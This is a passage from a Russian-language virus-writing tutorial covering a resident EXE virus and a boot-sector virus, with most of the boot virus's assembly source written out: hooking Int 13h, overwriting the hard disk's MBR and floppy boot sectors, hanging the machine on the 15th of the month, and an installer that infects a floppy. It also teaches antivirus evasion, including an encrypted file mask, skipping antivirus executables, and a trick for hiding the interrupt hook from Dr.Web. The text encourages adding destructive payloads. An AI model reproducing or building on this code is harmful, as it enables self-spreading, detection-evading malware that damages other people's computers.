<p>Защитить вирус от обнаружения в файле намного проще, чем в памяти. Достаточно только зашифровать маску для поиска EXE - программ (*.exe), и вирус обнаружен не будет.Естественно, перед поиском файла - жертвы маска должна быть расшифрована, а в зараженном файле присутствовать в зашифрованном виде.</p>
<p>Для решения этой задачи был предложен такой алгоритм: маска расшифровывается вирусной копией, находящейся в памяти, непосредственно перед поиском EXE-файла,а при записи вирусного кода в файл снова шифруется. Вряд-ли DOCTOR WEB станет устанавливать резидентный вирус в память, а потом еще и проверять, как он работает. А при простом просмотре или даже прохождении зараженной программы отладчиком можно увидеть только закодированную маску.</p>
<h4><a name="p227">2.7 Несколько слов о вредных действиях вирусной программы</a></h4>
<p>Вирус, как правило, для того и пишется, чтобы кому-то навредить или пошутить над пользователями. Поэтому естественно было бы включить в него какие-нибудь действия, мешающие нормальной работе операторов компьютеров. Конечно, здесь существует огромная свобода : от тривиальной блокировки клавиатуры до "осыпания" букв с экрана или форматирования винчестера. Многие вирусы вообще содержат серьезные ошибки, из - за которых зараженная система может перестать работать, поэтому что - нибудь более неприятное придумать непросто. Поскольку книга носит учебный харатер, мы не будем развивать " вредительскую " тему, а вместо этого предоставим нашим читателям возможность творчески подойти к задаче. Можете не огорчаться - встроить в вирусную программу вредное действие на порядок проще, чем создать эту программу. Учтите только, что изготовление вирусов - дело очень неблагодарное, и без должной конспирации способно принести самому "писателю" массу неприятностей. Сами вирусы (особенно чужие) - довольно неприятная штука, хотя эта тема очень интересна.</p>
<h4><a name="p228">2.8 Полный текст резидентного EXE-вируса</a></h4>
<p>Как я уже говорил, эта программа является просто итогом всех предыдущих и фактически составлена из их частей. Поэтому больше объяснять, вероятно, нечего. Последний штрих - приведем полный текст разработанного нами резидентного EXE - вируса:</p>
<p><a href="files/vik00_ru/exetsr.asm">Скачать exetsr.asm (26Kb)</a></p>
<p>Как видите, в вирусе приняты определенные меры для того, чтобы он не смог заразить антивирусные программы. Дело в том,что все ( или почти все ) антивирусы при запуске проверяют себя на зараженность, и при обнаружении изменений своего кода выдают соответствующее сообщение. Поэтому вирус проверяет, содержатся - ли в имени найденного файла такие фрагменты:</p>
<pre class="source">
               name_1        db 'ADIN';Файлы, имена
               name_2        db 'DINF';которых начи-
               name_3        db 'DRWE';наются так, за-
               name_4        db 'AIDS';ражать нельзя !
               name_5        db 'ANTI'
               name_6        db 'WEB'
</pre>
<p>Для проверки используется разработанная ранее процедура SEARCH. Если найденный файл действительно является антивирусной программой, наш вирус отказывается от попытки заразить его.</p>
<p>* Как вы заметили,в вирусе отсутствуют обработчики Int 13h и Int 2Fh. Так сделано потому, что предлагаемая программа отлично работает без какой - бы то ни было "фильтрации" прерывания Int 13h. Проверка повторной загрузки возложена на обработчик Int 28h, по этой причине прерывание Int 2Fh перехватывать не нужно.</p>
<h2><a name="p3">Часть 3. Загрузочные вирусы</a></h2>
<h3><a name="p31">Глава 1. Разработка загрузочной вирусной программы</a></h3>
<h4><a name="p311">1.1 Краткие сведения о начальной загрузке персонального компьютера</a></h4>
<p>Для начала следует сказать несколько слов о том, как происходит начальная загрузка ЭВМ. После проверки аппаратной части компьютера и заполнения таблицы векторов прерываний BIOS пытается прочитать первый сектор нулевой дорожки нулевой стороны диска в дисководе "A". Этот сектор помещается в память по адресу 0000:7C00h, после чего на указанный адрес передается управление. В прочитанном секторе содержится программа начальной загрузки (BOOT - запись) и некоторые другие сведения, необходимые для доступа к данным на диске. Программа начальной загрузки проверяет, является - ли диск системным. Если это так, то загрузка операционной системы с диска продолжается, а если нет,то на экран выводится сообщение:</p>
<pre>
	Non system disk or disk error
	Replace and press any key when ready .
</pre>
<p>после чего система ожидает действий оператора. Если же диск в " A " - дисководе отсутствует, то программа BIOS считывает первый сектор нулевой дорожки нулевой стороны первого жесткого диска. Он также помещается в память по адресу 0000:7C00h, после чего по указанному адресу передается управление. В прочитанном секторе на жестком диске записана так называемая MBR (главная загрузочная запись). MBR является программой, которая определяет активный раздел жесткого диска, считывает загрузочную запись (BOOT - запись) этого раздела в оперативную память и отдает ей управление. Дальше все происходит, как при загрузке системы с гибкого диска. Как видим, процесс загрузки с винчестера является как бы двухступенчатым. Если же программа MBR не нашла активный раздел, то выдается сообщение об отсутствии загрузочных устройств, и система останавливается. В некоторых старых машинах при невозможности запустить операционную систему загружался интерпретатор языка БЕЙСИК, записанный в микросхемах ПЗУ. Однако новые модели компьютеров не содержат встроенного интерпретатора и не используют его.</p>
<h4><a name="p312">1.2 Понятие о загрузочных вирусах</a></h4>
<p>Загрузочными называют вирусы, способные заражать загрузочные сектора гибких и жестких дисков и получающие управление при попытке " запустить " операционную систему с зараженного диска. Можно выделить следующие основные разновидности вирусных программ указанного типа:</p>
<ol>
<li>Заражающие BOOT - сектора гибких дисков</li>
<li>Заражающие BOOT - запись активного раздела жесткого диска и BOOT - сектора гибких дисков</li>
<li>Заражающие MBR (Master Boot Record) жесткого диска BOOT - сектора гибких дисков</li>
</ol>
<p>Отметим,что заражение BOOT - секторов дискет является обязательным, иначе вирус просто не сможет распространяться. Кроме того, почти все загрузочные вирусы являются резидентными,что объясняется спецификой их работы. Нерезидентный вирус смог бы размножаться только в том случае, если при загрузке с диска " A " из дисковода " B " забыли вытащить дискету, или при загрузке с зараженного винчестера диск находится в одном из дисководов. Очевидно, что при таком алгоритме работы вирус размножался бы очень медленно, и его создание было бы просто бессмысленным. Большое распространение получили также файлово - загрузочные вирусы, которые могут заражать файлы типов EXE, COM а иногда и другие. Ярким представителем этой разновидности можно считать ONEHALF, который может заражать EXE и COM - файлы. Файлово - загрузочные вирусы являются более заразными, чем файловые. Создать такой вирус также сложнее, и поэтому их подробное рассмотрение выходит за рамки данной книги.</p>
<h4><a name="p313">1.3 Алгоритм работы загрузочного вируса</a></h4>
<p>Несмотря на огромное разнообразие загрузочных вирусных программ, алгоритмы их работы незначительно отличаются друг от друга. В этом пункте мы рассмотрим одну из возможных реализаций такого алгоритма. Только сначала условимся, что наш вирус будет заражать загрузочные сектора гибких дисков и MBR (Master Boot Record) первого жесткого диска. Поэтому можно предложить следующий "план работы":</p>
<p>Попав при начальной загрузке машины в память по адресу 0000:7C00h, вирус должен выполнить такие действия:</p>
<ol>
<li>Установить регистры SS и SP на собственный стек</li>
<li>"Отрезать" у системы несколько килобайтов памяти (сколько именно - зависит от длины вирусного кода)</li>
<li>Переписать свой код в полученную область (кстати, она будет находиться в старших адресах основной памяти)</li>
<li>Передать управление следующей секции своего кода, уже расположенной в конце основной памяти</li>
</ol>
<p>Эта секция, в свою очередь, должна:</p>
<ol>
<li>Переопределить вектор прерывания Int 13h на вирусный код</li>
<li>Считать настоящий загрузочный сектор в память по адресу 0000:7C00h</li>
<li>Проверить, заражен - ли винчестер. Если нет, то заразить его MBR</li>
<li>Передать управление настоящему загрузочному сектору, находящемуся по адресу 0000:7C00h</li>
</ol>
<p>Далее загрузка ОС выполняется, как обычно. Когда система будет загружена,вирус должен заняться заражением BOOT - секторов дискет. С этой целью он выполняет такие действия:</p>
<ol>
<li>При чтении секторов с номерами 2...N нулевой дорожки нулевой стороны диска " A " проверяет BOOT этого диска на зараженность</li>
<li>Если диск еще не инфицирован - заражает его</li>
<li>Передает управление системному обработчику Int 13h</li>
</ol>
<p>Под заражением понимают запись вирусного кода в BOOT - сектор дискеты или в MBR винчестера. Понятно, что при загрузке с винчестера проверять его на зараженность бессмысленно. И тем не менее, наш вирус делает это, так как отключить проверку жесткого диска не так просто, как это может показаться. Кроме того, она выполняется очень быстро и поэтому совершенно не ощущается пользователем. На первый взгляд, приведенный алгоритм кажется довольно сложным. Тем не менее, его достаточно просто реализовать, в чем вы скоро убедитесь. Хотелось бы сказать о том, какой должна быть максимальная длина вирусного кода. Если мы хотим поместить вирус в загрузочный сектор целиком, следует учесть два момента.</p>
<ol>
<li>Собственно программа загрузки в MBR занимает не более, чем 446 байт (см. ПРИЛОЖЕНИЕ 2)</li>
<li>Программа загрузки в BOOT - секторе дискеты имеет разный размер в разных версиях DOS. В самом "предельном" случае она начинается со смещения 0055h относительно начала сектора. Два последних байта BOOT и MBR содержат код: 55AAh. Если его затереть,система перестанет загружаться с испорченного таким образом диска. Некоторые вирусы используют этот прием для приведения дискеты или винчестера в "частично нерабочее" состояние.</li>
</ol>
<p>Отсюда следует очевидный вывод - размер кода вируса не может превышать : 200h - 55h - 02h = 1A9h = 425 байт! Если вы не выйдете за эту границу, обращение к диску будет происходить корректно. Кроме того, даже NORTON DISK DOCTOR не будет замечать изменений программы загрузки в BOOT - секторе дискеты или MBR винчестера, что, согласитесь, очень важно.</p>
<h4><a name="p314">1.4 Как начинается распространение вируса</a></h4>
<p>В отличие от файловых вирусов, для внедрения загрузочного вируса в компьютер достаточно просто попробовать загрузиться с зараженной дискеты, при этом дискета не обязательно должна быть загрузочной. В этом состоит особенность вирусов этого типа. Итак, чтобы вирус начал распространяться, достаточно заразить им гибкий диск, а потом попытаться загрузиться с него на той или иной машине.</p>
<h4><a name="p315">1.5 Начало работы</a></h4>
<p>Как и прежде,будем разрабатывать загрузочный вирус в виде COM-программы. Поэтому:</p>
<pre class="source">
    prg segment
       assume cs:prg,ds:prg,es:prg,ss:prg
          org 100h
</pre>
<h4><a name="p316">1.6 Вирус получает управление</a></h4>
<p>Как вы уже знаете,загрузочный вирус получает управление только при загрузке операционной системы. Далее он должен " отрезать " у DOS несколько килобайтов памяти и переписать свой код в полученную область. Для выполнения этих функций можно предложить такой фрагмент:</p>
<pre class="source">
    my_prg:    xor ax,ax              ;
               mov ss,ax              ;
               mov sp,7bfeh           ;Установка собс-
                                      ;твенного стека
               push ax                ;Сохраним в сте-
               push bx                ;ке используемые
               push cx                ;регистры
               push dx                ;
               push si                ;
               push ds                ;
               push es                ;
               pushf                  ;
                                      ;
               push cs                ;DS = CS
               pop ds                 ;
                                      ;
    sub word ptr ds:[0413h],2         ;"Отрежем" у DOS
               mov ax,ds:[0413h]      ;два килобайта
               mov cl,6               ;памяти и вычис-
                                      ;лим
               sal ax,cl              ;сегментный ад-
                                      ;рес,по которому
                                      ;находится полу-
                                      ;ченный блок
               mov es,ax              ;Поместим адрес
                                      ;в ES
               xor si,si              ;И скопируем код
               mov cx,prg_lenght      ;вируса длиной
    prg_copy:  db 8ah                 ;"prg_lenght" в
               db 9ch                 ;память по адре-
    additor    db 00h                 ;су ES : 0000h
               db 7ch                 ;Сам код при за-
               mov byte ptr es:[si],bl;грузке помещае-
               inc si                 ;тся BIOS по ад-
               loop cs:prg_copy       ;ресу 0000:7C00h
                                      ;
               push ax                ;Запишем в стек
               mov ax,to_read_boot    ;адрес ES:to_re-
               push ax                ;ad_boot и осу-
               db 0cbh                ;ществим переход
                                      ;на этот адрес
</pre>
<p>Поскольку операционная система к моменту начала выполнения этого фрагмента еще не загружена, "увести" у вычислительной системы два килобайта памяти не предсталяет никакого труда. Для этого просто следует уменьшить на два число,расположенное в области данных BIOS по адресу : 0000:0413h. Загрузившись, операционная система просто не будет замечать занятую вирусом память. Даже такие программы, как RELEASE или Volkov Commander (нажмите ALT + F5) не помогут обнаружить, где именно "притаился" вирус (правда, это не так трудно рассчитать, но для рядового " юзера " такая задача непосильна).</p>
<p>Машинный код</p>
<pre class="source">
               db 8ah                 ;
               db 9ch                 ;
    additor    db 00h                 ;
               db 7ch                 ;
</pre>
<p>является кодом команды: "mov bl, byte ptr [si + 7C00h]" и модифицируется в зависимости от того, что именно удалось заразить вирусу - если загрузка происходит с винчестера, то код будет иметь вид:</p>
<pre class="source">
               db 8ah                 ;
               db 9ch                 ;
    additor    db 00h                 ;
               db 7ch                 ;
</pre>
<p>а если с дискеты:</p>
<pre class="source">
               db 8ah                 ;
               db 9ch                 ;
    additor    db 55h                 ;
               db 7ch                 ;
</pre>
<p>Дело в том, что в MBR жесткого диска тело вируса располагается по смещению 0000h от начала сектора, а в BOOT - записи дискеты это же смещение равно 0055h ( см. п. 1.11 ).При заражении того или иного диска вирус определяет необходимое значение поля "additor", которое потом будет записано в загрузочный сектор. Команда " ret far " для краткости записана в виде машинного кода 0CBh.</p>
<p>Идея установки собственного стека заимствована из настоящей MBR жесткого диска. Если оставить стек "как есть", то в некоторых случаях система будет зависать при загрузке - проверено на практике!</p>
<h4><a name="p317">1.7 Защита от антивирусных программ</a></h4>
<p>В настоящее время существует только одна распространенная антивирусная программа, с которой следует считаться при разработке нового вируса. Это всем известный DOCTOR WEB. Благодаря довольно совершенному алгоритму эвристического анализа, DOCTOR WEB способен обнаружить новый вирус не только в файлах, но и в загрузочных секторах гибких и жестких дисков компьютера. В предыдущей главе мы рассмотрели, как можно скрыть присутствие вирусных кодов в файлах и оперативной памяти ЭВМ. Теперь, вероятно, следует рассказать, как решается задача маскировки загрузочного вируса. После нескольких дней экспериментов было установлено, что при поиске неизвестных загрузочных вирусов DOCTOR WEB пытается определить факт перехвата прерывания INT 13h, при этом антивирус даже не пробует пройти встроенным отладчиком подозрительную BOOT или MBR. Если, по мнению программы, INT 13h было перехвачено, выдается сообщение о возможном наличии в вашем компьютере неизвестного загрузочного вируса. Отсюда следует очевидный вывод:</p>
<p>Команду, задающую адрес в таблице векторов прерываний или выполняющую модификацию вектора INT 13h, следует зашифровать, и вирус найден не будет!</p>
<p>Однако сделать корректный шифровщик, хорошо работающий на любом процессоре, не так просто. Поэтому задача была решена следующим образом:</p>
<pre class="source">
               mov si,vvv - 100h      ;
    mov word ptr es:[si],to_new_13h   ;Установим
    mov word ptr es:[si + 2],cs       ;вектор Int 13h
                                      ;на вирусный об-
                                      ;работчик
                                      ;
</pre>
<p>Как это ни странно, DOCTOR WEB "не догадался", что команда</p>
<pre class="source">    
               mov si,vvv - 100h
</pre>
<p>пересылает в SI число 04Ch, имеющее прямое отношение к вектору прерывания Int 13h. Проверка приведенного метода на практике показала его пригодность.</p>
<h4><a name="p318">1.8 Перехватываем Int 13h</a></h4>
<p>Согласно описанному выше алгоритму, настало время перехватить прерывание Int 13h. Наш вирус будет использовать его для отслеживания операций с дискетами. Итак:</p>
<pre class="source">
    to_read_boot   equ   $ - my_prg   ;
                                      ;
    read_boot: push cs                ;DS = CS
               pop ds                 ;
                                      ;
               xor si,si              ;SI = 0
               mov es,si              ;ES = SI
                                      ;Получим вектор
                                      ;Int 13h и сох-
                                      ;раним его :
    mov bx,word ptr es:[4ch]          ;
    mov word ptr old_13h - 100h,bx    ;
    mov bx,word ptr es:[4eh]          ;
    mov word ptr old_13h_2 - 100h,bx  ;
                                      ;
               mov si,vvv - 100h      ;
    mov word ptr es:[si],to_new_13h   ;И установим
    mov word ptr es:[si + 2],cs       ;вектор Int 13h
                                      ;на вирусный об-
                                      ;работчик
                                      ;
</pre>
<p>Прерывание здесь перехватывается путем непосредственной модификации вектора в таблице векторов прерываний. Константа " to_read_boot " задает смещение от начала вирусного кода до метки "read_boot", с которой и начинается код,выполняющий переопределение вектора Int 13h на вирусный обработчик. Дополнительных пояснений работа фрагмента не требует.</p>
<h4><a name="p319">1.9 Читаем исходную BOOT-запись</a></h4>
<p>Сначала договоримся, где наш вирус будет хранить настоящую загрузочную запись (BOOT - для дискет или MBR - для жестких дисков).</p>
<p>Обычно на нулевой дорожке нулевой стороны винчестера используется только самый первый сектор, а остальные свободны. Поэтому было бы естественно сохранить MBR в одном из секторов нулевой дорожки. Нас заинтересовал сектор с номером 12, но можно было бы взять и любой другой. Только не следует выбирать сектора с очень большими номерами. Может случиться так, что, например сектора с номером 100 на диске просто не существует ( особенно это относится к старым накопителям ). Оптимальный номер - не выше двадцати.</p>
<p>Для дискет оригинальную BOOT - запись лучше всего записывать в последний сектор последней дорожки на первой стороне заражаемого диска.</p>
<p>Для того, чтобы с зараженного диска можно было загрузиться, вирус должен считать исходную загрузочную запись в память по адресу : 0000:7C00h и после выполнения необходимых действий передать ей управление:</p>
<pre class="source">
               mov dx,num_head - 100h ;Считаем настоя-
               mov cx,cyl_sect - 100h ;щий загрузочный
               mov bx,7c00h           ;сектор в память
               mov ax,0201h           ;по адресу
               int 13h                ;0000:7C00h
</pre>
<p>В приведенном фрагменте задействованы ячейки памяти:</p>
<pre class="source">
    num_head   dw   0                 ;Здесь вирус
    cyl_sect   dw   0                 ;хранит номер
                                      ;головки,дорожки
                                      ;и сектора зара-
                                      ;женного диска ,
                                      ;в которых запи-
                                      ;сана настоящая
                                      ;загрузочная
                                      ;запись .
</pre>
<p>Несколько позже мы разберемся,как определяются помещаемые в них значения.</p>
<h4><a name="p31a">1.10 Заражаем MBR винчестера</a></h4>
<p>Следуя алгоритму, настало время проверить, заражена - ли MBR первого жесткого диска, и если нет - заразить ее. Поэтому приступим к делу:</p>
<pre class="source">
               push cs                ;ES = CS
               pop es                 ;
                                      ;
               mov dl,0080h           ;Считаем MBR
               call cs:read_mbr       ;винчестера
               jc cs:to_quit          ;по адресу
                                      ;CS:0400h, при-
                                      ;чем загрузка
                                      ;сейчас может
                                      ;производиться
                                      ;и с дискеты !
    cmp byte ptr ds:[400h],33h        ;MBR уже зара-
               je cs:to_quit          ;жена ?
                                      ;
               mov dx,0080h           ;Нулевая головка
                                      ;первого жестко-
                                      ;го диска
               mov cx,000ch           ;Сектор 12,
                                      ;дорожка 0
               mov dl_save - 100h,dl  ;
                                      ;Сохраним эти
                                      ;параметры .
               call cs:write_mbr_last ;Кроме того,
                                      ;перепишем нас-
                                      ;тоящую MBR в
                                      ;сектор 12
               jc cs:to_quit          ;нулевой дорожки
                                      ;на нулевой сто-
                                      ;роне HDD .
               xor si,si              ;Сформируем код
               mov additor - 100h,00h ;для записи его
               mov cx,prg_lenght      ;
    copy_vir_mbr:                     ;на место исход-
               mov al,byte ptr ds:[si];ной MBR
    mov byte ptr ds:[si + 400h],al    ;
               inc si                 ;
               loop cs:copy_vir_mbr   ;
                                      ;
               mov dx,0080h           ;Запишем этот
               call cs:write_mbr      ;код в первый
                                      ;сектор нулевой
                                      ;дорожки нулевой
                                      ;стороны винчес-
                                      ;тера
    to_quit:   mov ah,04h             ;Наш
               int 1ah                ;вирус при
               jc cs:bad_clock        ;загрузке по
               cmp dl,15h             ;15 - м числам
    vis:       je cs:vis              ;вешает систему
    bad_clock: popf                   ;Восстановим из
               pop es                 ;стека
               pop ds                 ;регистры
               pop si                 ;
               pop dx                 ;
               pop cx                 ;
               pop bx                 ;
               pop ax                 ;
                                      ;
               db   0eah              ;И отдадим упра-
               dw   7c00h             ;вление настоя-
               dw   0000h             ;щей загрузочной
                                      ;записи ( MBR )
</pre>
<p>Как вы видите, вирус достаточно свободно "чувствует" себя в памяти. В самом деле - свой код он записывает в младшие 512 байт первого "отрезанного" у DOS килобайта, а MBR винчестера считывает в младшие 512 байт второго килобайта. Так сделано для большей понятности программы и облегчения программирования, но один килобайт памяти фактически тратится впустую (что с некоторой натяжкой можно отнести к вредным действиям нашего вируса). Процедура "read_mbr" читает сектор 1 дорожки 0 на нулевой стороне указанного диска. Процедура "write_mbr" записывает данные из буфера по адресу : CS:0400h в сектор 1 дорожки 0 на нулевой стороне указанного диска. Процедура " write_mbr_last " записывает данные из буфера по адресу : CS:0400h в заданный сектор того или иного диска и заполняет ячейки памяти:</p>
<pre class="source">
    num_head
    и cyl_sect.
</pre>
<p>Для проверки зараженности MBR вирус сравнивает ее первый байт с первым байтом своего кода - числом 33h. Далее, в поле "additor" заносится число 00h, необходимое для корректной загрузки с винчестера. Стоит отметить, что заражение MBR происходит исключительно при загрузке с зараженной дискеты. Когда операционная система будет загружена, вирус будет инфицировать только гибкие диски при попытке прочитать их содержимое.А поскольку никому не придет в голову менять жесткие диски во включенной в сеть и работающей машине, нет смысла предусматривать заражение MBR в резидентном режиме. Если же попробовать проделать вышеописанную процедуру, то компьютер с высокой вероятностью выйдет из строя, и вирус " погибнет " вместе с ним.</p>
<h4><a name="p31b">1.11 Пишем обработчик прерывания Int 13h</a></h4>
<p>Наконец все подготовительные действия завершены, и мы можем заняться разработкой вирусного обработчика прерывания Int 13h. Именно этот обработчик должен отслеживать операции с гибкими дисками и при необходимости заражать их.</p>
<p>Начнем с выяснения условий, при которых вирус должен будет заразить BOOT - сектор дискеты. Пусть заражение будет выполняться в том случае, если происходит чтение любого сектора нулевой дорожки нулевой стороны, кроме первого. Исходя из этого, можно записать:</p>
<pre class="source">
                                      ;Далее следует
                                      ;вирусный обра-
                                      ;ботчик Int 13h
    to_new_13h equ   $ - my_prg       ;
                                      ;
    new_13h:   pushf                  ;Сохраним флаги
               cmp dl,01h             ;Операция с дис-
                                      ;ководом " A "
                                      ;или " B " ?
               ja cs:to_sys_13h       ;Нет !
               cmp ah,02h             ;Чтение ?
               jne cs:to_sys_13h      ;Нет !
               cmp ch,00h             ;Дорожка " 0 " ?
               jne cs:to_sys_13h      ;Нет !
               cmp cl,01h             ;Сектор-первый ?
               je cs:to_sys_13h       ;Да !
               call cs:boot_infect    ;Вызовем проце-
                                      ;дуру заражения
                                      ;BOOT - секторов
                                      ;дискет
    to_sys_13h:                       ;
               popf                   ;Восстановим
                                      ;флаги
               db 0eah                ;Перейдем к сис-
    old_13h    dw 0                   ;темному обра-
    old_13h_2  dw 0                   ;ботчику Int 13h
</pre>
<p>Обратите внимание, что при чтении секторов 2...N нулевой дорожки нулевой стороны дискеты управление передается процедуре " boot_infect ", которая занимается заражением гибких дисков. Если бы заражение происходило при чтении любого сектора, то на зараженной машине все операции с дисководом выполнялись бы раздражающе медленно. Для передачи управления системному обработчику Int 13h используется обычная команда далекого перехода, записанная в виде машинной инструкции. Теперь разработаем процедуру " boot_infect ", заражающую дискеты. Естественно сделать ее по аналогии с фрагментом, который " работает " с винчестером. Поэтому:</p>
<pre class="source">
    boot_infect proc                  ;
               push ax                ;Сохраним реги-
               push bx                ;стры в стеке
               push cx                ;прерванного
               push dx                ;процесса
               push di                ;
               push ds                ;
               push es                ;
               pushf                  ;
                                      ;
               push cs                ;ES = CS
               pop es                 ;
                                      ;
               push cs                ;DS = CS
               pop ds                 ;
                                      ;
               mov cx,3               ;Попробуем про-
    next_read: push cx                ;честь BOOT -
                                      ;сектор дискеты.
               call cs:read_mbr       ;На это даем три
               pop cx                 ;попытки (напри-
               jnc cs:inf_check       ;мер,если двига-
                                      ;тель дисковода
                                      ;не успел разо-
                                      ;гнаться до ра-
                                      ;бочей скорости,
                                      ;то BIOS вернет
                                      ;ошибку -дискета
                                      ;сменена ! )
               xor ah,ah              ;При ошибке -
               pushf                  ;сбросим текущий
    call dword ptr old_13h - 100h     ;дисковод
               jc cs:to_jump          ;и повторим
               loop cs:next_read      ;чтение
    to_jump:   jmp cs:restore_regs    ;
                                      ;BOOT - сектор
                                      ;заражен ?
    inf_check: cmp byte ptr ds:[455h],33h
               je cs:to_jump          ;Да !
    cmp word ptr ds:[40bh],200h       ;512 байт в
                                      ;секторе ?
               jne cs:to_jump         ;Нет !
                                      ;
               mov dl_save - 100h,dl
               mov ch,79              ;Определим
               mov dh,byte ptr ds:[415h]
               cmp dh,0f0h            ;параметры
               je cs:real_80          ;дискеты
               cmp dh,0f9h            ;по ее
               je cs:real_80          ;Media
               cmp dh,0fdh            ;Descryptor
               jne cs:to_jump         ;
               mov ch,39              ;
    real_80:   mov dh,01h             ;
               mov cl,byte ptr ds:[418h]

                                      ;Перепишем нас-
                                      ;тоящий BOOT в
                                      ;последний сек-
                                      ;тор последней
                                      ;дорожки на пос-
                                      ;ледней стороне
               xor dl,dl              ;
               call cs:write_mbr_last ;
               jc cs:to_jump          ;
                                      ;
               mov additor - 100h,055h;Сформируем код,
               xor di,di              ;который нужно
               mov cx,prg_lenght      ;записать на
    copy_vir:  mov al,byte ptr ds:[di];дискету вместо
    mov byte ptr ds:[di + 455h],al    ;исходной BOOT -
               inc di                 ;записи
               loop cs:copy_vir       ;
    mov word ptr ds:[400h],053ebh     ;
                                      ;
               xor dh,dh              ;И запишем его
               call cs:write_mbr      ;в первый
                                      ;сектор нулевой
                                      ;дорожки нулевой
                                      ;стороны дискеты
                                      ;
    restore_regs:                     ;Восстановим из
               popf                   ;стека регистры
               pop es                 ;
               pop ds                 ;
               pop di                 ;
               pop dx                 ;
               pop cx                 ;
               pop bx                 ;
               pop ax                 ;
               ret                    ;Выйдем из про-
                                      ;цедуры
    boot_infect endp                  ;
</pre>
<p>Как вы успели заметить, текст процедуры очень похож на текст фрагмента, который будет заражать жесткий диск. Небольшие отличия связаны со спецификой работы дисковода и винчестера. Дело в том, что жесткий диск вращается непрерывно (за исключением некоторых новых систем с режимом экономии электроэнергии), а двигатель дисковода запускается только при закрытии его флажка (если быть точным, это зависит от конструкции дисковода.) Поэтому, если двигатель дисковода к моменту выполнения операции чтения не набрал необходимую скорость, BIOS вернет ошибку и сообщит, что дискета сменена. В этом случае рекомендуется повторить чтение, предварительно сбросив накопитель. Наш вирус повторяет попытку чтения три раза, после чего в случае неудачи отказывается от заражения такого диска.</p>
<p>Несколько раньше мы выяснили, что для разных версий MS DOS и WINDOWS программа начальной загрузки в BOOT - секторе дискеты располагается по разным смещениям. Сделано это по той причине, что старшие версии операционной системы хранят в загрузочном секторе более подробные сведения о диске. Наибольшим смещением,с которым вы когда - либо можете встретиться, является 0055h. Поэтому наш вирус будет помещать в BOOT - сектор свой код, ориентируясь именно на приведенное значение. Тогда в первые два байта сектора должна быть записана команда перехода на начало этого кода, а именно : " EB 53 ". Формат BOOT - сектора приведен в ПРИЛОЖЕНИИ 2.</p>
<p>И последнее - вирус определяет параметры заражаемой дискеты исходя из ее Media Descryptor. Сам Descryptor содержится в BOOT - секторе любой дискеты и вместе с некоторыми другими параметрами однозначно задает ее тип. Интерпретация различных дескрипторов приведена в конце ПРИЛОЖЕНИЯ 2.</p>
<h4><a name="p31c">1.12 Используемые процедуры</a></h4>
<p>Фактически вирус уже изготовлен. Осталось лишь привести тексты процедур, которые он будет использовать в своей работе:</p>
<pre class="source">
    read_mbr   proc                   ;
               xor dh,dh              ;
               mov ax,0201h           ;Процедура
               mov bx,400h            ;читает первый
               mov cx,01h             ;сектор нулевой
               pushf                  ;дорожки нулевой
    call dword ptr old_13h - 100h     ;стороны указан-
               ret                    ;ного накопителя
    read_mbr   endp                   ;
                                      ;
    write_mbr proc                    ;
               mov ax,0301h           ;Процедура
               mov cx,01h             ;помещает вирус-
               pushf                  ;ный код в BOOT-
    call dword ptr old_13h - 100h     ;сектор дискеты
               ret                    ;или записывает
    write_mbr  endp                   ;его вместо MBR
                                      ;винчестера
                                      ;
    write_mbr_last proc               ;Процедура
                                      ;переписывает
                                      ;исходную BOOT-
                                      ;запись или MBR
               mov num_head - 100h,dx ;в заданный
               mov cyl_sect - 100h,cx ;сектор
               mov dl,dl_save - 100h  ;заражаемого
                                      ;диска
               mov ax,0301h           ;
               pushf                  ;
    call dword ptr old_13h - 100h     ;
               ret                    ;
    write_mbr_last endp               ;
</pre>
<p>Процедуры построены очень просто, и объяснять их работу, скорее всего, нет смысла. Отметим только, что все вызовы Int 13h оформлены в виде вызова дальней процедуры. Это необходимо для предотвращения потенциальных " глюков ", связанных с нереентерабельностью программ, выполняющих обработку Int 13h. Хотя такой метод несколько увеличивает размер вирусного кода.</p>
<h4><a name="p31d">1.13 Область данных вируса</a></h4>
<p>В отличие от предыдущих программ, область данных написанного нами загрузочного вируса имеет на удивление простую структуру:</p>
<pre class="source">
                                      ;
               db   'Kot!'            ;Название вируса
    dl_save    db   0                 ;Ячейка для вре-
                                      ;менного хране-
                                      ;ния регистра DL
                                      ;( он задает
                                      ;номер накопите-
                                      ;ля )
    num_head   dw   0                 ;Здесь вирус
    cyl_sect   dw   0                 ;хранит номер
                                      ;головки,дорожки
                                      ;и сектора зара-
                                      ;женного диска ,
                                      ;на которых за-
                                      ;писана настоя-
                                      ;щая загрузочная
                                      ;запись
    vvv        dw   004ch             ;Смещение к век-
                                      ;тору Int 13h
                                      ;Длина вирусного
                                      ;кода :
               prg_lenght   equ   $ - my_prg
</pre>
<p>Вы можете спросить, почему для имени вируса отведено всего четыре байта. Дело в том,что наш вирус получился довольно большим (421 байт - можете проверить!). Несколько раньше мы выяснили, что этот размер не может быть больше, чем 425 байт. А 425 - 421 как раз равно четырем...</p>
<h4><a name="p31e">1.14 Пишем секцию инсталляции</a></h4>
<p>Очевидно, в таком виде, в каком сейчас существует наш вирус, его довольно трудно внедрить в систему. Поэтому для облегчения этой "вредительской" операции напишем специальный инсталлятор. Его функция состоит в следующем : при старте запускающей программы из командной строки или из - под оболочки заразить диск в дисководе " A ".Причем диск совсем не обязательно должен быть загрузочным. Далее с этого диска нужно загрузиться на той машине, которую требуется заразить. При этом вирус заразит MBR ее жесткого диска. Теперь, после загрузки с винчестера, вирус будет инфицировать все читаемые на зараженной машине дискеты и начнет распространяться.</p>
<p>Исходя из сказанного выше, можно предложить такое решение:</p>
<pre class="source">
    installer: lea si,my_prg          ;Подменим коман-
               mov byte ptr [si],33h  ;ду перехода на
    mov byte ptr [si + 1],0c0h        ;первые три бай-
    mov byte ptr [si + 2],8eh         ;та кода вируса
                                      ;Попробуем про-
                                      ;честь BOOT -
                                      ;сектор дискеты.
               mov ax,0201h           ;
               mov cx,01h             ;
               xor dx,dx              ;
               lea bx,bufer           ;
               int 13h                ;
               jc error               ;
                                      ;
               push es                ;Получим пара-
               mov ah,08h             ;метры дискеты
               xor dl,dl              ;
               int 13h                ;
               jnc all_good           ;
               cmp ah,01h             ;
               jne error              ;
               mov dh,01h             ;
               mov ch,27h             ;
    mov cl,byte ptr bufer [18h]       ;
    all_good:  xor dl,dl              ;
               mov num_head,dx        ;
               mov cyl_sect,cx        ;
               pop es                 ;
                                      ;Перепишем нас-
                                      ;тоящий BOOT в
                                      ;последний сек-
                                      ;тор последней
                                      ;дорожки на пос-
                                      ;ледней стороне
               mov ax,0301h           ;
               lea bx,bufer           ;
